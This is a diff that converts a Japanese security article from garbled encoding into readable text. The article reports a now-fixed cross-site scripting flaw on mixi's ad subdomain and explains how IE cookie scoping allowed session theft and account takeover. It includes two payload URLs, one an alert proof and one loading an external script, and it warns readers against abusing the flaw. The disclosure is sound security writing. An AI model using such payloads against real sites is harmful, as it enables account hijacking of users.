@@ -1,47 +1,47 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- �恛��: mixi�ɃA�J�E���g������\�ȐƎ㐫 ---
+--- 第○章: mixiにアカウント乗っ取り可能な脆弱性 ---
 
-���ҁF����
+著者：金床
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �͂��߂�
+■0x01.) はじめに
 
-�@2006�N10�����݁A500���l�ȏ�̉��������ƌ�����mixi�B�M�҂��y�������p
-���Ă���B������R�ɂ��N���X�T�C�g�X�N���v�e�B���O���\�ȉӏ���������
-�̂ŁA���̐Ǝ㐫�ɂ��ĕ񍐂���B����mixi�ɂ͘A���ς݂ł���A�Y���ӏ���
-�ӂ�����Ă���B
-
-
-��0x02.) �T�v
-
-�@���񔭌������̂͂悭����N���X�T�C�g�X�N���v�e�B���O�Ǝ㐫�ł���B�N��
-�X�T�C�g�X�N���v�e�B���O�͊e���ʂŕ񍐂���Ă���Ƃ���A�����E�C�O����
-�������̃E�F�u�A�v���P�[�V�����ɑ��݂����Ƃ����Ǝ㐫���B�U���҂͔�Q
-�҂̃E�F�u�u���E�U��ōD���ȓ��e��JavaScript�𓮍삳���邱�Ƃ��ł���Bmi
-xi�̂悤�ɃZ�b�V�����Ǘ���Cookie�𗘗p���Ă���ꍇ�A�U���҂�Cookie�̓��e
-�𓐂ނ��ƂŔ�Q�҂̃A�J�E���g�������邱�Ƃ��ł���B
-
-�@���񌩂������Ǝ㐫�ł́A�d�l�̈Ⴂ�ɂ��AIE�݂̂�Cookie�̓���\
-�ł���B���̂���FireFox��Opera�AKonqueror�Ȃǂ̃E�F�u�u���E�U�ł͂���ق�
-�[���Ȕ�Q�͔������Ȃ����낤�B
-
-�@����̐Ǝ㐫��㩂̃y�[�W���ɏ�����iframe��݂��邱�ƂȂǂŔ�Q�҂��C��
-���Ȃ�������Cookie�𓐂ނ��Ƃ��\�Ȃ��̂��B�W�I���s���葽���̃��[�U�̏�
-���A���邢�͓���̃��[�U�̏ꍇ���l�����邪�A�ǂ���̃P�[�X�ł��U���҂�
-㩂̃y�[�W�����炩���ߐݒu���Ă����A�����ւ̃����N���f���⃁�[���Ȃǂ�
-���ߍ���ŕW�I��U���o�����ƂɂȂ邾�낤�B
+　2006年10月現在、500万人以上の会員がいると言われるmixi。筆者も楽しく利用
+している。今回偶然にもクロスサイトスクリプティングが可能な箇所を見つけた
+ので、この脆弱性について報告する。既にmixiには連絡済みであり、該当箇所は
+ふさがれている。
 
 
-��0x03.) �Ǝ㐫�����݂���ӏ�
+■0x02.) 概要
 
-�@�Ǝ㐫��http://mixi.jp/home.pl����Ăяo�����http://ads.mixi.jp/jserv
-er/***�i***�̕����͔C�ӂ̕�����j�ɑ��݂���B�Ⴆ��URL��http://ads.mixi.
-jp/jserver/hoge�̏ꍇ�AHTTP���X�|���X�̃{�f�B���͎��̂悤�ɂȂ�B
+　今回発見したのはよくあるクロスサイトスクリプティング脆弱性である。クロ
+スサイトスクリプティングは各方面で報告されているとおり、国内・海外を問わ
+ず多くのウェブアプリケーションに存在されるとされる脆弱性だ。攻撃者は被害
+者のウェブブラウザ上で好きな内容のJavaScriptを動作させることができる。mi
+xiのようにセッション管理にCookieを利用している場合、攻撃者はCookieの内容
+を盗むことで被害者のアカウントを乗っ取ることができる。
+
+　今回見つかった脆弱性では、仕様の違いにより、IEのみでCookieの盗難が可能
+である。そのためFireFoxやOpera、Konquerorなどのウェブブラウザではそれほど
+深刻な被害は発生しないだろう。
+
+　今回の脆弱性は罠のページ内に小さなiframeを設けることなどで被害者が気づ
+かないうちにCookieを盗むことが可能なものだ。標的が不特定多数のユーザの場
+合、あるいは特定のユーザの場合が考えられるが、どちらのケースでも攻撃者は
+罠のページをあらかじめ設置しておき、そこへのリンクを掲示板やメールなどに
+埋め込んで標的を誘い出すことになるだろう。
+
+
+■0x03.) 脆弱性が存在する箇所
+
+　脆弱性はhttp://mixi.jp/home.plから呼び出されるhttp://ads.mixi.jp/jserv
+er/***（***の部分は任意の文字列）に存在する。例えばURLがhttp://ads.mixi.
+jp/jserver/hogeの場合、HTTPレスポンスのボディ部は次のようになる。
 
 -----
 document.writeln("<A HREF=\"http://ads.mixi.jp/ADCLICK/CID=fffffffcfffffffcfffffffc/hoge\" TARGET=\"_blank\">");
@@ -49,75 +49,75 @@ document.writeln("<IMG SRC=\"http://img.ads.mixi.jp/AE3.gif?A\" ALT=\"\" BORDER=
 document.close();
 -----
 
-�@���e����킩��Ƃ���A���̃��X�|���X��JavaScript�ł���B���̃R���e���c
-��<script src=url>�̌`�ŌĂяo����邱�Ƃ�z�肵�Ă�����̂Ǝv����B
+　内容からわかるとおり、このレスポンスはJavaScriptである。このコンテンツ
+は<script src=url>の形で呼び出されることを想定しているものと思われる。
 
-�@URL�����̂悤�ɂ��邱�ƂŃX�N���v�g�����s�\�ł���A���ꂪ�N���X�T�C�g
-�X�N���v�e�B���O�Ǝ㐫�ł��邱�Ƃ��m�F�����B
+　URLを次のようにすることでスクリプトが実行可能であり、これがクロスサイト
+スクリプティング脆弱性であることが確認される。
 
 -----
 http://ads.mixi.jp/jserver/</a><script>alert('xss');</script>
 -----
 
-�@����Ɏ��̂悤�ɂ��邱�ƂŁA�E�F�u��ɂ������i�T�C�Y���傫���jJavaScri
-pt�����s�ł���B
+　さらに次のようにすることで、ウェブ上においた（サイズが大きい）JavaScri
+ptを実行できる。
 
 -----
 http://ads.mixi.jp/jserver/</a><script src=http://www.example.com/foo.js></script>
 -----
 
 
-��0x04.) �A�J�E���g�̏�����
+■0x04.) アカウントの乗っ取り
 
-�@�Ǝ㐫�����݂���z�X�g�́uads.mixi.jp�v�ł���B�܂�A�����mixi�ł̑�
-���̃A�v���P�[�V���������삷��z�X�g�umixi.jp�v�Ƃ͕ʂ̃z�X�g�ł���B
+　脆弱性が存在するホストは「ads.mixi.jp」である。つまり、これはmixiでの多
+くのアプリケーションが動作するホスト「mixi.jp」とは別のホストである。
 
-�@mixi�ł̓��O�C������ۂ�Cookie�����s����邪�A���̂Ƃ�domain�����̎w��
-�͂Ȃ��BFireFox��Opera�ł͂��̂悤��domain�����̎w�肪�Ȃ�Cookie�́u����
-�z�X�g�̂݁v�̂��̂ł���ƔF�����A�T�u�h���C�������z�X�g�i�uads.mixi.j
-p�v�Ȃǁj�ɂ͂���Cookie�𑗏o�����AJavaScript�ł̃A�N�Z�X���ւ��Ă���B��
-����IE�͎d�l���قȂ�A�T�u�h���C�������z�X�g�ɂ�Cookie�𑗏o���AJavaSc
-ript�ł��A�N�Z�X���\�ł���B�܂�A�uads.mixi.jp�v���document.cookie
-��ǂ݂Ƃ�ƁAmixi.jp��Cookie�̓��e�ɂ��̂܂܃A�N�Z�X�ł��Ă��܂��̂ł���B
+　mixiではログインする際にCookieが発行されるが、このときdomain属性の指定
+はない。FireFoxやOperaではこのようなdomain属性の指定がないCookieは「その
+ホストのみ」のものであると認識し、サブドメインを持つホスト（「ads.mixi.j
+p」など）にはこのCookieを送出せず、JavaScriptでのアクセスも禁じている。し
+かしIEは仕様が異なり、サブドメインを持つホストにもCookieを送出し、JavaSc
+riptでもアクセスが可能である。つまり、「ads.mixi.jp」上でdocument.cookie
+を読みとると、mixi.jpのCookieの内容にそのままアクセスできてしまうのである。
 
-�@�ǂ݂Ƃ���Cookie���g����mixi�ɃA�N�Z�X���邱�ƂŁA�A�J�E���g�̏�����
-���\�ƂȂ��Ă��܂��B���̂Ƃ��p�X���[�h���K�v�ȑ�����̂������ׂĂ̋@�\
-���\�ƂȂ�i�������A���ɂ��̂悤�ȃA�N�Z�X���s��ꂽ�ꍇ�A���炩�ȕs��
-�A�N�Z�X�@�ᔽ�ł��낤�Ǝv����B���̂��߁A�������ǎ҂��ʂ̉ӏ��ɃN���X
-�T�C�g�X�N���v�e�B���O�Ǝ㐫�𔭌������ꍇ�ł��A���̂悤�ȃA�N�Z�X�͂���
-�͂Ȃ�Ȃ��j�B
-
-
-��0x05.) �[���x��
-
-�@Cookie�Ɋi�[�����Z�b�V����ID�ŃZ�b�V�����Ǘ����s���E�F�u�A�v���P�[�V��
-���ł́A�N���X�T�C�g�X�N���v�e�B���O�͒v���I�Ȃ��̂ƂȂ�imixi�ł̓Z�b�V
-����ID���قڌŒ肳��Ă��邽�߁A����ɂ悭�Ȃ��j�Bmixi�Ƃ����E�F�u�A�v��
-�P�[�V�����ɂ��čl�����Ƃ��ɂ́A����̐Ǝ㐫�́u�ƂĂ��[�����v�ƌ�����
-���낤�B
-
-�@�������A�M�҂̎����ƂȂ邪�Amixi�Ƃ����E�F�u�A�v���P�[�V�����́i�P�Ȃ�j
-�R�~���j�P�[�V�����̂��߂̂��̂ł���A�I�����C���o���N��V���b�s���O�T�C
-�g�̂悤�ɋ���N���W�b�g�J�[�h�������Ă���킯�ł͂Ȃ��B���̂��߁Amixi��
-�����E�F�u�A�v���P�[�V�������̂��u�[���ȁv���݂ł͂Ȃ��̂��B
-
-�@�Z�b�V����ID�������_���ȕ�����łȂ�������A�ŋߏ����b��ɂȂ����悤��
-�摜�ɔF�؂�������Ȃ�������ȂǁAmixi�ɂ̓Z�L�����e�B���ʂɂ���قǂ��
-�C���Ȃ��悤�ȕ��͋C����������B�������Amixi�͂����܂Łu�y���݁v�̂���
-�̑��݂Ȃ̂ŁA�M�Ҍl�Ƃ��Ă͂���ŕʂɂ��܂�Ȃ��Ǝv���Ă���i��́u�C
-���^�[�l�b�g�̌���ł��v�̕���͂�����Ƃǂ����Ǝv�������j�B�܂��A���[�U
-�����ƂĂ��������Ƃ���A�Z�L�����e�B�ʂŊÂ��i�͂����Ă��Ȃ��j���A�p�t
-�H�[�}���X�����P����Ă���Ƃ����ʂ�����̂�������Ȃ��B�Z�L�����e�B���J
-�`�J�`�Ńp�t�H�[�}���X���x�������A�y�[�W�����������\�����������悢��
-�������[�U���������񂢂邾�낤�B
+　読みとったCookieを使ってmixiにアクセスすることで、アカウントの乗っ取り
+が可能となってしまう。このときパスワードが必要な操作をのぞくすべての機能
+が可能となる（ただし、仮にこのようなアクセスが行われた場合、明らかな不正
+アクセス法違反であろうと思われる。そのため、もしも読者が別の箇所にクロス
+サイトスクリプティング脆弱性を発見した場合でも、このようなアクセスはして
+はならない）。
 
 
-��0x06.) �܂Ƃ�
+■0x05.) 深刻度は
 
-�@����͋��R�݂���mixi�̃N���X�T�C�g�X�N���v�e�B���O�Ǝ㐫�����グ���B
-�M�҂̓E�F�u�A�v���P�[�V�����Z�L�����e�B�Ɋւ���b����������[�����O���X
-�g���^�p���Ă���B�E�F�u�A�v���P�[�V�����J���҂���Z�L�����e�B�֌W�҂܂ŁA
-���L���l�X�̎Q�������҂����Ă���B���ЎQ���������������B
+　Cookieに格納したセッションIDでセッション管理を行うウェブアプリケーショ
+ンでは、クロスサイトスクリプティングは致命的なものとなる（mixiではセッシ
+ョンIDがほぼ固定されているため、さらによくない）。mixiというウェブアプリ
+ケーションについて考えたときには、今回の脆弱性は「とても深刻だ」と言える
+だろう。
+
+　しかし、筆者の私見となるが、mixiというウェブアプリケーションは（単なる）
+コミュニケーションのためのものであり、オンラインバンクやショッピングサイ
+トのように金やクレジットカードを扱っているわけではない。そのため、mixiと
+いうウェブアプリケーション自体が「深刻な」存在ではないのだ。
+
+　セッションIDがランダムな文字列でなかったり、最近少し話題になったように
+画像に認証がかからなかったりなど、mixiにはセキュリティ方面にそれほどやる
+気がないような雰囲気が感じられる。しかし、mixiはあくまで「楽しみ」のため
+の存在なので、筆者個人としてはそれで別にかまわないと思っている（例の「イ
+ンターネットの現状です」の文句はちょっとどうかと思ったが）。また、ユーザ
+数がとても多いことから、セキュリティ面で甘い（力を入れていない）分、パフ
+ォーマンスが改善されているという面もあるのかもしれない。セキュリティがカ
+チカチでパフォーマンスが遅いよりも、ページがさくさく表示される方がよいと
+いうユーザもたくさんいるだろう。
+
+
+■0x06.) まとめ
+
+　今回は偶然みつけたmixiのクロスサイトスクリプティング脆弱性を取り上げた。
+筆者はウェブアプリケーションセキュリティに関する話題を扱うメーリングリス
+トを運用している。ウェブアプリケーション開発者からセキュリティ関係者まで、
+幅広い人々の参加をお待ちしている。ぜひ参加いただきたい。
 
 http://www.freeml.com/ctrl/html/MLInfoForm/seasurfers@freeml.com
 
